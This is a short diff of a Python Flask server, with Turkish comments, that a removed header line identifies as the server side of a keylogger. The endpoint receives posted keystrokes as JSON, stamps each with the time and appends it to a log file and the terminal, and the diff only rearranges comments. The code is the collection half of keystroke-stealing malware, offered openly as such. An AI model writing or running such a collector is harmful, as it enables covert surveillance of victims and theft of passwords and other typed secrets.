@@ -1,4 +1,3 @@
-# Sunucu tarafı — başlatmak için: python3 keylogger.py
 from flask import Flask, request
 import datetime
 
@@ -14,14 +13,12 @@ def log_key():
     data = request.get_json()
     key_data = data.get('key')
     
-    # Zaman damgası oluştur
+    # Hatalı satır düzeltildi:
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     log_entry = f"[{timestamp}] {key_data}"
     
-    # Terminale yaz
-    print(log_entry)
+    print(log_entry)  # Terminale yaz
     
-    # Log dosyasına ekle
     with open(LOG_FILE, "a") as f:
         f.write(log_entry + "\n")
     
